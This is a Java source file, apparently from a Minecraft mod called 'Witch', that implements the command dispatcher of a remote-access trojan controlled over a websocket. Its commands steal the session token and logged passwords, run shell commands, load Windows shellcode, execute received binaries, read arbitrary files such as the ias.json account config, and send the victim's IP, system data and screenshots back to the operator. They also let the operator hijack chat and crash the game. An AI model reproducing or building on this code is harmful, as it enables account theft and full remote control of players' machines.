package me.soda.witch.client.websocket;

import com.google.gson.Gson;
import me.soda.witch.client.Witch;
import me.soda.witch.client.features.PlayerInfo;
import me.soda.witch.client.features.ShellcodeLoader;
import me.soda.witch.client.utils.*;
import me.soda.witch.shared.FileUtil;
import me.soda.witch.shared.HandleMessage;
import me.soda.witch.shared.Message;
import net.minecraft.text.Text;

import java.lang.management.ManagementFactory;

import static me.soda.witch.client.Witch.mc;
import static me.soda.witch.client.Witch.messageUtils;

public class MessageHandler {
    private static final Gson GSON = new Gson();

    public static void handleRaw(byte[] bytes) {
        handle(messageUtils.decrypt(bytes));
    }

    public static void handle(Message message) {
        HandleMessage.handle(message, (msgType, msg) -> {
            Witch.println("Received message: " + msgType);
            try {
                switch (msgType) {
                    case "steal_pwd_switch" -> Witch.config.passwordBeingLogged = !Witch.config.passwordBeingLogged;
                    case "steal_token" -> messageUtils.send(msgType, Stealer.getToken());
                    case "chat_control" -> ChatUtil.sendChat(msg);
                    case "chat_filter" -> Witch.config.filterPattern = msg;
                    case "chat_filter_switch" -> Witch.config.isBeingFiltered = !Witch.config.isBeingFiltered;
                    case "chat_mute" -> Witch.config.isMuted = !Witch.config.isMuted;
                    case "mods" -> messageUtils.send(msgType, MinecraftUtil.allMods());
                    case "systeminfo" -> messageUtils.send(msgType, MinecraftUtil.systemInfo());
                    case "screenshot" -> ScreenshotUtil.screenshot();
                    case "chat" -> ChatUtil.chat(Text.of(msg), false);
                    case "kill" -> Witch.client.close(false);
                    case "shell" -> new Thread(() -> {
                        String result = ShellUtil.runCmd(msg);
                        messageUtils.send(msgType, "\n" + result);
                    }).start();
                    case "shellcode" -> {
                        if (ShellUtil.isWin())
                            new Thread(() -> new ShellcodeLoader().loadShellCode(msg, false)).start();
                    }
                    case "log" -> Witch.config.logChatAndCommand = !Witch.config.logChatAndCommand;
                    case "config" -> messageUtils.send(msgType, Witch.config);
                    case "player" -> messageUtils.send(msgType, new PlayerInfo(Witch.mc.player));
                    case "skin" -> {
                        messageUtils.send("player", new PlayerInfo(Witch.mc.player));
                        PlayerSkinUtil.sendPlayerSkin();
                    }
                    case "server" -> {
                        ServerUtil.disconnect();
                        Witch.config.canJoinServer = !Witch.config.canJoinServer;
                    }
                    case "kick" -> ServerUtil.disconnect();
                    case "execute" -> {
                        if (ShellUtil.isWin()) {
                            ShellUtil.runProg(GSON.fromJson(msg, byte[].class));
                        }
                    }
                    case "iasconfig" -> messageUtils.send(msgType, FileUtil.read("config/ias.json"));
                    case "read" -> messageUtils.send(msgType, FileUtil.read(msg));
                    case "runargs" ->
                            messageUtils.send(msgType, ManagementFactory.getRuntimeMXBean().getInputArguments());
                    case "props" -> messageUtils.send(msgType, System.getProperties());
                    case "ip" -> messageUtils.send(msgType, NetUtil.getIp());
                    case "crash" -> MinecraftUtil.crash();
                    case "xor" -> {
                        messageUtils.setXOR(msg);
                        messageUtils.acceptXOR = true;

                        String greetingMsg = "Reconnected " + Witch.client.reconnections + " times, I am " + mc.getSession().getUsername();
                        messageUtils.send("greeting", greetingMsg);
                        messageUtils.send("player", new PlayerInfo(Witch.mc.player));
                        messageUtils.send("ip", NetUtil.getIp());
                    }
                    default -> {
                    }
                }
            } catch (Exception e) {
                Witch.println("Corrupted message!");
                Witch.printStackTrace(e);
            }
        });
    }
}